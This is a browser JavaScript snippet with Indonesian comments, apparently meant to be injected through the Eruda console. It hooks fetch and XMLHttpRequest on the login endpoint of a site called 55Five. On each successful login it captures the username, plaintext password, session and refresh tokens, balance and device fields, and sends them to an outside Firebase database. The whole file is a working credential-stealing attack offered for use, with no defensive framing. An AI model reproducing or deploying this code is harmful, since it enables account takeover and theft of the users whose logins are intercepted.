// ============================================================
// SCRIPT ERUDA - SAVE LOGIN CREDENTIALS TO FIREBASE
// Hook Login API 55Five dan simpan data ke Firebase
// ============================================================

(function() {
    'use strict';

    // ============================================================
    // 1. Konfigurasi Firebase
    // ============================================================
    const FIREBASE_URL = 'https://chatting-87e87-default-rtdb.firebaseio.com';

    // ============================================================
    // 2. Fungsi untuk menyimpan data ke Firebase
    // ============================================================
    async function saveToFirebase(username, data) {
        try {
            const url = `${FIREBASE_URL}/users/${encodeURIComponent(username)}.json`;
            const response = await fetch(url, {
                method: 'PUT', // Update atau create dengan key username
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }

            const result = await response.json();
            console.log('✅ Firebase: Data berhasil disimpan untuk user', username);
            console.log('📦 Response Firebase:', result);
            return true;
        } catch (error) {
            console.error('❌ Firebase error:', error);
            return false;
        }
    }

    // ============================================================
    // 3. Fungsi untuk menangani response Login
    // ============================================================
    function handleLoginResponse(requestBody, responseData) {
        try {
            // Ambil username & password dari request body
            let username = requestBody.username || '';
            let password = requestBody.pwd || '';

            // Jika tidak ada, coba dari response
            if (!username && responseData.data) {
                username = responseData.data.userName || responseData.data.username || '';
            }

            if (!username) {
                console.warn('⚠️ Username tidak ditemukan, skip save');
                return;
            }

            // Siapkan data yang akan disimpan
            const dataToSave = {
                username: username,
                password: password,
                userId: responseData.data?.userId || '',
                nickName: responseData.data?.nickName || '',
                token: responseData.data?.token || '',
                refreshToken: responseData.data?.refreshToken || '',
                expiresIn: responseData.data?.expiresIn || '',
                amount: responseData.data?.amount || '',
                loginTime: responseData.data?.LoginTime || new Date().toISOString(),
                serviceNowTime: responseData.serviceNowTime || new Date().toISOString(),
                savedAt: new Date().toISOString()
            };

            // Tambahkan data lain yang mungkin berguna
            const additionalFields = ['phoneType', 'deviceId', 'language', 'signature', 'timestamp'];
            additionalFields.forEach(field => {
                if (requestBody[field] !== undefined) {
                    dataToSave[field] = requestBody[field];
                }
            });

            console.log('📝 Menyimpan data user:', username);
            console.log('📦 Data:', dataToSave);

            // Kirim ke Firebase
            saveToFirebase(username, dataToSave).then(success => {
                if (success) {
                    console.log(`✅ Data user ${username} berhasil disimpan ke Firebase`);
                } else {
                    console.warn(`⚠️ Gagal menyimpan data user ${username} ke Firebase`);
                }
            });

        } catch (error) {
            console.error('❌ Error processing login response:', error);
        }
    }

    // ============================================================
    // 4. Hook untuk Fetch API
    // ============================================================
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        return originalFetch.apply(this, args).then(response => {
            // Clone response agar bisa dibaca tanpa merusak stream
            const clonedResponse = response.clone();

            // Cek apakah request mengarah ke endpoint Login
            const url = args[0] || '';
            if (typeof url === 'string' && url.includes('/api/webapi/Login')) {
                // Ambil request body dari args
                let requestBody = {};
                try {
                    if (args[1] && args[1].body) {
                        const bodyStr = args[1].body;
                        if (typeof bodyStr === 'string') {
                            requestBody = JSON.parse(bodyStr);
                        }
                    }
                } catch (e) {
                    console.warn('Gagal parsing request body:', e);
                }

                // Baca response JSON
                clonedResponse.json().then(data => {
                    if (data && data.code === 0 && data.data) {
                        console.log('🔐 Login berhasil! Menyimpan data...');
                        handleLoginResponse(requestBody, data);
                    } else {
                        console.warn('⚠️ Login response error atau tidak sukses:', data);
                    }
                }).catch(err => {
                    console.warn('Gagal parsing response JSON:', err);
                });
            }

            return response;
        });
    };

    // ============================================================
    // 5. Hook untuk XMLHttpRequest
    // ============================================================
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
        this._method = method;
        this._url = url;
        // Simpan request body nanti di send
        return originalOpen.apply(this, [method, url, ...rest]);
    };

    XMLHttpRequest.prototype.send = function(body) {
        this._requestBody = body;

        // Tambahkan event listener untuk response
        this.addEventListener('load', function() {
            if (this._url && typeof this._url === 'string' && this._url.includes('/api/webapi/Login')) {
                try {
                    const responseData = JSON.parse(this.responseText);
                    if (responseData && responseData.code === 0 && responseData.data) {
                        // Parse request body
                        let requestBody = {};
                        try {
                            if (this._requestBody && typeof this._requestBody === 'string') {
                                requestBody = JSON.parse(this._requestBody);
                            }
                        } catch (e) {}

                        console.log('🔐 Login berhasil (XHR)! Menyimpan data...');
                        handleLoginResponse(requestBody, responseData);
                    }
                } catch (err) {
                    console.warn('Gagal parsing XHR response:', err);
                }
            }
        });

        return originalSend.apply(this, arguments);
    };

    // ============================================================
    // 6. Inisialisasi
    // ============================================================
    console.log('✅ Script hook Login API aktif! Menunggu request login...');
    console.log(`📡 Firebase target: ${FIREBASE_URL}/users/{username}.json`);
    console.log('🔍 Setiap login akan otomatis menyimpan username, password, token, dll.');

})();
